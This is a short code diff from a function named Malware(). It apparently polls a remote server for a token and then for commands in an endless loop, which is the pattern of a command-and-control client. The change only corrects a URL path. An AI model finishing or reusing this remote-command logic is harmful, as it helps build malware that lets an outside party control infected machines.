@@ -111,7 +111,7 @@ void Malware()
   string urlTokenAction = "/generatetoken.php";
 
   string apiToken = DeserializeJson("token",HttpGet(url,urlTokenAction));
-  string urlActionCommand = ("/getcommand.php/?token="+apiToken);
+  string urlActionCommand = ("/getcommand.php?token="+apiToken);
 
   while(true)
   {
